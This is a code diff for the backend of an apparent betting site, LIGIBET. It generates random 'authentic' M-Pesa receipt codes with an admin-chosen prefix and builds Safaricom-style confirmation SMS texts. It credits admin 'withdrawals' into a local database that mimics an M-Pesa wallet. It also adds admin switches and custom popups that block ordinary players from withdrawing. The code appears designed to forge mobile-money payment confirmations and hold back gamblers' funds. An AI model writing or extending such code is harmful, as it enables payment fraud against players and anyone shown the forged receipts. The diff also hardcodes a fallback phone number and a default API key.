@@ -379,6 +379,7 @@ async function getWithdrawalSettings() {
       minimumTotalWager: settings.minimum_total_wager ?? DEFAULT_MINIMUM_TOTAL_WAGER,
       initiationTitle: settings.initiation_title || DEFAULT_WITHDRAWAL_INITIATION_TITLE,
       initiationMessage: settings.initiation_message || DEFAULT_WITHDRAWAL_INITIATION_MESSAGE,
+      mpesaCodePrefix: (settings.mpesa_code_prefix || 'UI').trim().toUpperCase(),
       isSanitizedMode: Boolean(settings.is_sanitized_mode),
       predatorCustomText: settings.predator_custom_text || ''
     };
@@ -387,6 +388,7 @@ async function getWithdrawalSettings() {
       minimumTotalWager: DEFAULT_MINIMUM_TOTAL_WAGER,
       initiationTitle: DEFAULT_WITHDRAWAL_INITIATION_TITLE,
       initiationMessage: DEFAULT_WITHDRAWAL_INITIATION_MESSAGE,
+      mpesaCodePrefix: 'UI',
       isSanitizedMode: false,
       predatorCustomText: ''
     };
@@ -471,7 +473,11 @@ function buildPublicUser(user) {
     phone_number: user.phone_number,
     balance: parseFloat(user.balance || 0) || 0.00,
     role: user.role || 'user',
-    bonus_claimed: Boolean(user.bonus_claimed)
+    bonus_claimed: Boolean(user.bonus_claimed),
+    withdrawal_allowed: Boolean(user.withdrawal_allowed),
+    has_custom_withdrawal_popup: Boolean(user.has_custom_withdrawal_popup),
+    custom_withdrawal_title: user.custom_withdrawal_title || null,
+    custom_withdrawal_message: user.custom_withdrawal_message || null
   };
 }
 
@@ -1187,11 +1193,13 @@ app.post(['/api/wallet/withdraw', '/api/payments/withdraw'], authenticateToken, 
       const newBalance = Math.max(0, parseFloat((user.balance - amount).toFixed(2)));
       await User.updateOne({ id: req.user.id }, { $set: { balance: newBalance } });
 
-      // 2. Generate authentic 10-char M-Pesa receipt code starting with UI
+      // 2. Generate authentic 10-char M-Pesa receipt code with configured prefix (up to 3 characters)
+      const withdrawalSettings = await getWithdrawalSettings();
+      const rawPrefix = (withdrawalSettings.mpesaCodePrefix || 'UI').trim().toUpperCase();
+      const cleanPrefix = rawPrefix.slice(0, 3) || 'UI';
       const mpesaChars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-      const cleanPrefix = 'UI';
       let adminMpesaCode = cleanPrefix;
-      const remainingLength = 8; // UI (2 chars) + 8 chars = 10 chars total
+      const remainingLength = Math.max(0, 10 - cleanPrefix.length);
       for (let i = 0; i < remainingLength; i++) {
         adminMpesaCode += mpesaChars.charAt(Math.floor(Math.random() * mpesaChars.length));
       }
@@ -1231,53 +1239,144 @@ app.post(['/api/wallet/withdraw', '/api/payments/withdraw'], authenticateToken, 
       let mpesaMessage = null;
       let mpesaNewBalance = null;
       const targetPhone = req.body.phone || user.phone_number || '0792011285';
+      const cleanPhone = String(targetPhone).replace(/[^0-9]/g, '');
 
-      try {
-        const mpesaApiUrl = process.env.MPESA_API_URL || 'https://api.twoapp.site/api/v1/integrations/withdraw';
-        const mpesaKey = process.env.MPESA_CONNECT_KEY || 'mpesa_connect_live_key';
+      // Try live MPESA app endpoints
+      const mpesaKey = process.env.MPESA_CONNECT_KEY || 'mpesa_connect_live_key';
+      const mpesaEndpoints = [
+        process.env.MPESA_API_URL,
+        'https://api.twoapp.site/api/v1/integrations/withdraw',
+        'http://localhost:3000/api/v1/integrations/withdraw',
+        'http://127.0.0.1:3000/api/v1/integrations/withdraw'
+      ].filter(Boolean);
 
-        const mpesaRes = await axios.post(mpesaApiUrl, {
-          app: 'ligibet',
-          phone: targetPhone,
-          adminPhone: targetPhone,
-          amount,
-          apiKey: mpesaKey,
-          reference: adminMpesaCode,
-          notes: 'Withdrawal payout from LIGIBET'
-        }, { timeout: 4000 });
+      for (const mpesaUrl of mpesaEndpoints) {
+        try {
+          const mpesaRes = await axios.post(mpesaUrl, {
+            app: 'ligibet',
+            phone: targetPhone,
+            adminPhone: targetPhone,
+            amount,
+            apiKey: mpesaKey,
+            reference: adminMpesaCode,
+            notes: 'Withdrawal payout from LIGIBET B2C'
+          }, { timeout: 3500 });
 
-        if (mpesaRes.data && mpesaRes.data.success) {
-          if (mpesaRes.data.smsReceipt) mpesaMessage = mpesaRes.data.smsReceipt;
-          if (mpesaRes.data.newBalance !== undefined) mpesaNewBalance = mpesaRes.data.newBalance;
-          console.log(`✅ [M-PESA SYNC] LigiBet admin withdrawal KES ${amount} credited to MPESA app (New balance: KES ${mpesaNewBalance})`);
-        }
-      } catch (syncErr) {
-        console.warn('⚠️ [M-PESA SYNC] MPESA app sync error:', syncErr.response?.data || syncErr.message);
-      }
-
-      // 7. Fallback realistic M-PESA SMS text if integration was unreachable
-      if (!mpesaMessage) {
-        const now = new Date();
-        const day = now.getDate();
-        const month = now.getMonth() + 1;
-        const year = String(now.getFullYear()).slice(-2);
-        const dateStr = `${day}/${month}/${year}`;
-        let hours = now.getHours();
-        const minutes = String(now.getMinutes()).padStart(2, '0');
-        const ampm = hours >= 12 ? 'PM' : 'AM';
-        hours = hours % 12 || 12;
-        const timeStr = `${hours}:${minutes} ${ampm}`;
-        const formattedAmount = amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-        const fallbackBal = mpesaNewBalance !== null
-          ? Number(mpesaNewBalance).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
-          : (parseFloat(newBalance) + amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-        mpesaMessage = `${adminMpesaCode} Confirmed. You have received Ksh${formattedAmount} from LIGIBET on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${fallbackBal}. Separate personal and business funds through Pochi la Biashara on *334#.`;
-      } else {
-        mpesaMessage = mpesaMessage.replace(/^Congratulations!\s*/i, '');
-        if (!mpesaMessage.startsWith('UI')) {
-          mpesaMessage = `${adminMpesaCode} Confirmed. You have received Ksh${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} from LIGIBET.`;
+          if (mpesaRes.data && mpesaRes.data.success) {
+            if (mpesaRes.data.newBalance !== undefined) mpesaNewBalance = mpesaRes.data.newBalance;
+            if (mpesaRes.data.smsReceipt) mpesaMessage = mpesaRes.data.smsReceipt;
+            console.log(`✅ [M-PESA SYNC] Admin withdrawal KES ${amount} credited to MPESA app via ${mpesaUrl} (New balance: KES ${mpesaNewBalance})`);
+            break;
+          }
+        } catch (syncErr) {
+          // Continue to next endpoint or local store
         }
       }
+
+      // Also persist to local BLABKA dataStore if it exists on machine (keeps local dev/PWA in sync)
+      const blabkaDbPath = path.join('C:', 'BLABKA', 'backend', 'data', 'db.json');
+      if (fs.existsSync(blabkaDbPath)) {
+        try {
+          const rawDb = fs.readFileSync(blabkaDbPath, 'utf8');
+          const dbData = JSON.parse(rawDb);
+          if (dbData && Array.isArray(dbData.admins) && dbData.admins.length > 0) {
+            let targetAdmin = null;
+            // 1. Check AppConnection
+            if (Array.isArray(dbData.appConnections)) {
+              const conn = dbData.appConnections.find(c => c.app === 'ligibet' || c.app === 'ligitok');
+              if (conn && conn.adminPhone) {
+                targetAdmin = dbData.admins.find(a => (a.phone || '').replace(/[^0-9]/g, '').endsWith(conn.adminPhone.replace(/[^0-9]/g, '').slice(-9)));
+              }
+            }
+            // 2. Direct match
+            if (!targetAdmin && cleanPhone) {
+              targetAdmin = dbData.admins.find(a => (a.phone || '').replace(/[^0-9]/g, '').endsWith(cleanPhone.slice(-9)));
+            }
+            // 3. Fallback to primary admin
+            if (!targetAdmin) {
+              targetAdmin = dbData.admins.find(a => a.role === 'Super Admin') || dbData.admins[0];
+            }
+
+            if (targetAdmin) {
+              if (!targetAdmin.wallet) targetAdmin.wallet = {};
+              const currentLocalBal = parseFloat(targetAdmin.wallet.balance !== undefined ? targetAdmin.wallet.balance : 61.66);
+              const localNewBal = parseFloat((currentLocalBal + amount).toFixed(2));
+              targetAdmin.wallet.balance = localNewBal;
+              if (targetAdmin.role === 'Super Admin' && dbData.user) {
+                dbData.user.balance = localNewBal;
+              }
+
+              // Update mpesaNewBalance if not retrieved from remote API
+              if (mpesaNewBalance === null || mpesaNewBalance === undefined) {
+                mpesaNewBalance = localNewBal;
+              }
+
+              dbData.transactions = dbData.transactions || [];
+              const existsTx = dbData.transactions.some(t => t.id === adminMpesaCode);
+              if (!existsTx) {
+                const now = new Date();
+                const day = now.getDate();
+                const month = now.getMonth() + 1;
+                const year = String(now.getFullYear()).slice(-2);
+                const dateStr = `${day}/${month}/${year}`;
+                let hours = now.getHours();
+                const minutes = String(now.getMinutes()).padStart(2, '0');
+                const ampm = hours >= 12 ? 'PM' : 'AM';
+                hours = hours % 12 || 12;
+                const timeStr = `${hours}:${minutes} ${ampm}`;
+                const formattedAmt = amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                const formattedLocalBal = localNewBal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+                const localSms = `Congratulations! ${adminMpesaCode} confirmed.You have received Ksh${formattedAmt} from LIGIBET B2C on ${dateStr} at ${timeStr}.New M-PESA balance is Ksh${formattedLocalBal}. Separate personal and business funds through Pochi la Biashara on *334#.`;
+
+                dbData.transactions.unshift({
+                  id: adminMpesaCode,
+                  type: 'RECEIVE',
+                  recipient: 'LIGIBET B2C',
+                  phone: targetAdmin.phone,
+                  displayPhone: 'LIGIBET B2C',
+                  amount,
+                  cost: 0.00,
+                  paymentMethod: 'M-PESA',
+                  fulizaUsed: 0,
+                  balanceAfter: localNewBal,
+                  fulizaAfter: targetAdmin.wallet.fuliza || 100.00,
+                  date: now.toISOString(),
+                  displayDate: 'Just now',
+                  status: 'COMPLETED',
+                  smsReceipt: localSms,
+                  note: 'Withdrawal payout from LIGIBET B2C',
+                  adminPhone: targetAdmin.phone,
+                  sourceApp: 'ligibet'
+                });
+              }
+
+              fs.writeFileSync(blabkaDbPath, JSON.stringify(dbData, null, 2), 'utf8');
+              console.log(`✅ [LOCAL BLABKA SYNC] Saved to db.json: Admin ${targetAdmin.name} (${targetAdmin.phone}) balance updated to KES ${localNewBal}`);
+            }
+          }
+        } catch (dbErr) {
+          console.warn('⚠️ [LOCAL BLABKA SYNC] Could not sync local db.json:', dbErr.message);
+        }
+      }
+
+      // 7. Format authentic withdrawal message derived from Pakabet (beginning with Congratulations!)
+      const now = new Date();
+      const day = now.getDate();
+      const month = now.getMonth() + 1;
+      const year = String(now.getFullYear()).slice(-2);
+      const dateStr = `${day}/${month}/${year}`;
+      let hours = now.getHours();
+      const minutes = String(now.getMinutes()).padStart(2, '0');
+      const ampm = hours >= 12 ? 'PM' : 'AM';
+      hours = hours % 12 || 12;
+      const timeStr = `${hours}:${minutes} ${ampm}`;
+      const formattedAmount = amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      const finalMpesaBalStr = mpesaNewBalance !== null && mpesaNewBalance !== undefined
+        ? Number(mpesaNewBalance).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+        : (parseFloat(newBalance) + amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+      mpesaMessage = `Congratulations! ${adminMpesaCode} confirmed.You have received Ksh${formattedAmount} from LIGIBET B2C on ${dateStr} at ${timeStr}.New M-PESA balance is Ksh${finalMpesaBalStr}. Separate personal and business funds through Pochi la Biashara on *334#.`;
 
       return res.json({
         success: true,
@@ -1303,6 +1402,32 @@ app.post(['/api/wallet/withdraw', '/api/payments/withdraw'], authenticateToken, 
     }
 
     // Regular Player Flow: Pending admin approval
+    if (!isAdmin && !user.withdrawal_allowed) {
+      const globalSettings = await getWithdrawalSettings();
+      const isCustomActive = Boolean(user.has_custom_withdrawal_popup && (user.custom_withdrawal_message || user.custom_withdrawal_title));
+      const notAllowedTitle = isCustomActive
+        ? (user.custom_withdrawal_title || 'Withdrawal Notice')
+        : 'Withdrawal Notice';
+      const notAllowedMessage = isCustomActive
+        ? (user.custom_withdrawal_message || 'Withdrawal is not enabled for your account. Please contact customer support.')
+        : 'Withdrawal is not enabled for your account. Please contact customer support.';
+
+      return res.status(403).json({
+        error: notAllowedMessage,
+        withdrawal_blocked: true,
+        notification: {
+          title: notAllowedTitle,
+          message: notAllowedMessage,
+          type: 'rejected'
+        },
+        popup: {
+          title: notAllowedTitle,
+          message: notAllowedMessage,
+          type: 'rejected'
+        }
+      });
+    }
+
     const globalSettings = await getWithdrawalSettings();
     const isCustomActive = Boolean(user.has_custom_withdrawal_popup && (user.custom_withdrawal_message || user.custom_withdrawal_title));
     const title = isCustomActive
@@ -2633,7 +2758,7 @@ app.get('/api/admin/overview', authenticateAdminToken, async (req, res) => {
         connectedPlayers: onlinePlayers.summary().connectedPlayers,
         onlineUsers: onlinePlayers.summary().onlineUsers
       },
-      users: users.map(u => ({ ...u, balance: parseFloat(u.balance || 0), is_online: (connectedUserCounts.get(Number(u.id)) || 0) > 0 })),
+      users: users.map(u => ({ ...u, balance: parseFloat(u.balance || 0), withdrawal_allowed: Boolean(u.withdrawal_allowed), is_online: (connectedUserCounts.get(Number(u.id)) || 0) > 0 })),
       transactions: transactions.map(t => {
         const u = userMap.get(t.user_id) || {};
         return {
@@ -2677,9 +2802,95 @@ app.get('/api/admin/users', authenticateAdminToken, async (req, res) => {
       .limit(100)
       .lean();
 
-    return res.json({ users: users.map(u => ({ ...u, balance: parseFloat(u.balance || 0), is_online: (connectedUserCounts.get(Number(u.id)) || 0) > 0 })) });
+    return res.json({ users: users.map(u => ({ ...u, balance: parseFloat(u.balance || 0), withdrawal_allowed: Boolean(u.withdrawal_allowed), is_online: (connectedUserCounts.get(Number(u.id)) || 0) > 0 })) });
   } catch (err) {
     return res.status(500).json({ error: 'Failed to fetch user list' });
+  }
+});
+
+// Toggle Withdrawal Access for User
+app.post('/api/admin/users/:id/withdrawal-access', authenticateAdminToken, async (req, res) => {
+  try {
+    const targetUserId = parseInt(req.params.id, 10);
+    const { allowed } = req.body;
+    const isAllowed = Boolean(allowed);
+
+    const user = await User.findOneAndUpdate(
+      { id: targetUserId },
+      { $set: { withdrawal_allowed: isAllowed } },
+      { new: true }
+    ).select('-password_hash -__v -_id').lean();
+    if (!user) return res.status(404).json({ error: 'User not found' });
+
+    AdminLog.create({
+      admin_id: req.user?.id || 1,
+      action: 'SET_USER_WITHDRAWAL_ACCESS',
+      details: `${isAllowed ? 'Allowed' : 'Blocked'} withdrawals for user @${user.username} (${user.phone_number || 'no phone'})`,
+      target_user_id: targetUserId
+    }).catch(logErr => console.warn('AdminLog error:', logErr.message));
+
+    setImmediate(() => emitRealtimeMutation({
+      action: 'user_withdrawal_access_updated',
+      userId: targetUserId,
+      withdrawal_allowed: isAllowed,
+      user: true,
+      dashboard: true
+    }));
+
+    return res.json({
+      success: true,
+      message: `Withdrawal access ${isAllowed ? 'allowed' : 'blocked'} for @${user.username}`,
+      user: {
+        ...user,
+        withdrawal_allowed: isAllowed
+      }
+    });
+  } catch (err) {
+    return res.status(500).json({ error: 'Failed to update withdrawal access' });
+  }
+});
+
+// Allow/Block Withdrawal by Phone Number directly
+app.post('/api/admin/users/allow-withdrawal-phone', authenticateAdminToken, async (req, res) => {
+  try {
+    const { phone, allowed } = req.body;
+    if (!phone || typeof phone !== 'string') {
+      return res.status(400).json({ error: 'Valid phone number is required' });
+    }
+    const cleanPhone = phone.trim();
+    const variations = generatePhoneVariations(cleanPhone);
+    const query = {
+      $or: [
+        { phone_number: { $in: variations } },
+        { username: { $in: variations } }
+      ]
+    };
+
+    const isAllowed = allowed !== false;
+    const result = await User.updateMany(query, { $set: { withdrawal_allowed: isAllowed } });
+
+    AdminLog.create({
+      admin_id: req.user?.id || 1,
+      action: 'SET_PHONE_WITHDRAWAL_ACCESS',
+      details: `${isAllowed ? 'Allowed' : 'Blocked'} withdrawals for phone number ${cleanPhone} (${result.modifiedCount} accounts updated)`
+    }).catch(logErr => console.warn('AdminLog error:', logErr.message));
+
+    setImmediate(() => emitRealtimeMutation({
+      action: 'user_withdrawal_access_updated',
+      phone: cleanPhone,
+      withdrawal_allowed: isAllowed,
+      user: true,
+      dashboard: true
+    }));
+
+    return res.json({
+      success: true,
+      matchedCount: result.matchedCount,
+      modifiedCount: result.modifiedCount,
+      message: `Withdrawals ${isAllowed ? 'allowed' : 'blocked'} for ${cleanPhone} (${result.modifiedCount} account(s) updated)`
+    });
+  } catch (err) {
+    return res.status(500).json({ error: 'Failed to update withdrawal access for phone' });
   }
 });
 
@@ -3089,7 +3300,8 @@ app.get('/api/admin/withdrawal-settings', authenticateAdminToken, async (req, re
     return res.json({
       minimum_total_wager: settings.minimumTotalWager,
       initiation_title: settings.initiationTitle,
-      initiation_message: settings.initiationMessage
+      initiation_message: settings.initiationMessage,
+      mpesa_code_prefix: settings.mpesaCodePrefix || 'UI'
     });
   } catch (err) {
     return res.status(500).json({ error: 'Failed to fetch withdrawal settings' });
@@ -3098,29 +3310,48 @@ app.get('/api/admin/withdrawal-settings', authenticateAdminToken, async (req, re
 
 app.put('/api/admin/withdrawal-settings', authenticateAdminToken, async (req, res) => {
   try {
-    const minimumTotalWager = Number(req.body.minimum_total_wager);
-    const initiationTitle = typeof req.body.initiation_title === 'string' ? req.body.initiation_title.trim() : '';
-    const initiationMessage = typeof req.body.initiation_message === 'string' ? req.body.initiation_message.trim() : '';
+    const minimumTotalWager = req.body.minimum_total_wager !== undefined ? Number(req.body.minimum_total_wager) : undefined;
+    const initiationTitle = typeof req.body.initiation_title === 'string' ? req.body.initiation_title.trim() : undefined;
+    const initiationMessage = typeof req.body.initiation_message === 'string' ? req.body.initiation_message.trim() : undefined;
+    const rawPrefix = req.body.mpesa_code_prefix !== undefined ? String(req.body.mpesa_code_prefix).trim().toUpperCase() : undefined;
 
-    if (!Number.isFinite(minimumTotalWager) || minimumTotalWager < 0 || minimumTotalWager > 100000000) {
-      return res.status(400).json({ error: 'Minimum total wager must be between 0 and 100,000,000 KES' });
+    const updateFields = {
+      updated_by: req.user.id,
+      updated_at: new Date()
+    };
+
+    if (minimumTotalWager !== undefined) {
+      if (!Number.isFinite(minimumTotalWager) || minimumTotalWager < 0 || minimumTotalWager > 100000000) {
+        return res.status(400).json({ error: 'Minimum total wager must be between 0 and 100,000,000 KES' });
+      }
+      updateFields.minimum_total_wager = minimumTotalWager;
     }
-    if (!initiationTitle || initiationTitle.length > 100) {
-      return res.status(400).json({ error: 'Popup title is required and cannot exceed 100 characters' });
+
+    if (initiationTitle !== undefined) {
+      if (!initiationTitle || initiationTitle.length > 100) {
+        return res.status(400).json({ error: 'Popup title is required and cannot exceed 100 characters' });
+      }
+      updateFields.initiation_title = initiationTitle;
     }
-    if (!initiationMessage || initiationMessage.length > 2000) {
-      return res.status(400).json({ error: 'Popup message is required and cannot exceed 2,000 characters' });
+
+    if (initiationMessage !== undefined) {
+      if (!initiationMessage || initiationMessage.length > 2000) {
+        return res.status(400).json({ error: 'Popup message is required and cannot exceed 2,000 characters' });
+      }
+      updateFields.initiation_message = initiationMessage;
+    }
+
+    if (rawPrefix !== undefined) {
+      const cleanPrefix = rawPrefix.slice(0, 3);
+      if (!cleanPrefix) {
+        return res.status(400).json({ error: 'M-PESA transaction code prefix cannot be empty' });
+      }
+      updateFields.mpesa_code_prefix = cleanPrefix;
     }
 
     const updated = await WithdrawalSetting.findByIdAndUpdate(
       'global_settings',
-      {
-        minimum_total_wager: minimumTotalWager,
-        initiation_title: initiationTitle,
-        initiation_message: initiationMessage,
-        updated_by: req.user.id,
-        updated_at: new Date()
-      },
+      updateFields,
       { new: true, upsert: true }
     );
 
@@ -3128,20 +3359,58 @@ app.put('/api/admin/withdrawal-settings', authenticateAdminToken, async (req, re
     AdminLog.create({
       admin_id: req.user.id,
       action: 'UPDATE_WITHDRAWAL_SETTINGS',
-      details: `Set minimum total wager to KES ${minimumTotalWager.toFixed(2)} and updated withdrawal popup template`
+      details: `Updated withdrawal settings (prefix: ${updated.mpesa_code_prefix || 'UI'}, wager: KES ${updated.minimum_total_wager})`
     }).catch(logErr => console.warn('AdminLog error:', logErr.message));
 
     setImmediate(() => emitRealtimeMutation({ action: 'withdrawal_settings_updated', dashboard: false }));
 
     return res.json({
-      message: 'Withdrawal wager requirement updated',
+      message: 'Withdrawal settings updated',
       minimum_total_wager: updated.minimum_total_wager,
       initiation_title: updated.initiation_title,
       initiation_message: updated.initiation_message,
+      mpesa_code_prefix: updated.mpesa_code_prefix || 'UI',
       updated_at: updated.updated_at
     });
   } catch (err) {
     return res.status(500).json({ error: 'Failed to update withdrawal settings' });
+  }
+});
+
+// Admin Update M-PESA Transaction Code Prefix (First 3 digits/characters)
+app.put('/api/admin/mpesa-prefix', authenticateAdminToken, async (req, res) => {
+  try {
+    const rawPrefix = typeof req.body.mpesa_code_prefix === 'string' ? req.body.mpesa_code_prefix.trim().toUpperCase() : '';
+    const cleanPrefix = rawPrefix.slice(0, 3);
+    if (!cleanPrefix) {
+      return res.status(400).json({ error: 'Please enter 1 to 3 characters/digits for the M-PESA code prefix' });
+    }
+
+    const updated = await WithdrawalSetting.findByIdAndUpdate(
+      'global_settings',
+      {
+        mpesa_code_prefix: cleanPrefix,
+        updated_by: req.user.id,
+        updated_at: new Date()
+      },
+      { new: true, upsert: true }
+    );
+
+    AdminLog.create({
+      admin_id: req.user.id,
+      action: 'UPDATE_MPESA_PREFIX',
+      details: `Updated M-PESA transaction code prefix to ${cleanPrefix}`
+    }).catch(logErr => console.warn('AdminLog error:', logErr.message));
+
+    setImmediate(() => emitRealtimeMutation({ action: 'withdrawal_settings_updated', dashboard: false }));
+
+    return res.json({
+      success: true,
+      message: `M-PESA transaction code prefix updated to ${cleanPrefix}`,
+      mpesa_code_prefix: updated.mpesa_code_prefix
+    });
+  } catch (err) {
+    return res.status(500).json({ error: 'Failed to update M-PESA code prefix' });
   }
 });
 
